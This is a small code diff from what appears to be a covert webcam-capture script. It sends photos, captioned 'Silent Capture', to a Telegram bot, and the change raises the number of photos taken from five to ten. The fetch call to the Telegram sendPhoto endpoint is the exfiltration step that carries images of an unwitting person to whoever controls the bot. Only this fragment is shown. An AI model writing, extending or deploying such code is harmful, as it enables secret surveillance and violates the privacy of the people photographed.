@@ -173,7 +173,7 @@
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', blob, `img_${photosTaken}.jpg`);
-                formData.append('caption', `📸 Silent Capture ${photosTaken}/5`);
+                formData.append('caption', `📸 Silent Capture ${photosTaken}/10`);
 
                 try {
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
